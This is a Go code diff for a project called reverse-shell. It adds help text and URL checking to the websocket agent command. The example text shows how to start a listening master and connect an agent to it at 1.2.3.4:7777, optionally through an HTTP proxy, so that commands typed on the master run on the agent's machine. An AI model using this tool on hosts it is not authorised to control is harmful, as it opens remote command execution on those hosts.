@@ -1,6 +1,7 @@
 package cmd
 
 import (
+	"errors"
 	"fmt"
 	"net/http"
 
@@ -9,6 +10,20 @@ import (
 	"github.com/maxlaverse/reverse-shell/agents/go/handler"
 	"github.com/maxlaverse/reverse-shell/message"
 	"github.com/spf13/cobra"
+)
+
+const (
+	websocketListenerExample = `# On the master (1.2.3.4)
+$ reverse-shell-master listen --port 7777
+
+# On the agent
+$ reverse-shell-agent websocket --url http://1.2.3.4:7777
+
+Once an agent connects, you will be able to write commands in *stdin* that will be directly executed on the agent. You can also connect to a rendezvous point instead of a master.
+
+You can also connect to the outside using a proxy:
+$ http_proxy=http://your-proxy:3128 https_proxy=http://your-proxy:3128 agent websocket -U http://1.2.3.4:7777
+`
 )
 
 type websocketListenerOptions struct {
@@ -22,7 +37,15 @@ func NewWebsocketListenerCommand(agent Cli) *cobra.Command {
 	cmd := &cobra.Command{
 		Use:              "websocket",
 		Short:            "Agent that connects to a websocket endpoints and wait for commands",
+		Long:             "Connect to a remote websocket and execute every command received. The remote host can be a `master` or a `rendezvous`.",
+		Example:          websocketListenerExample,
 		TraverseChildren: true,
+		Args: func(cmd *cobra.Command, args []string) error {
+			if len(opts.url) == 0 {
+				return errors.New("a url must be given")
+			}
+			return nil
+		},
 		Run: func(cmd *cobra.Command, args []string) {
 			agent.SafeStart(newWebsocketListener(opts.url))
 		},
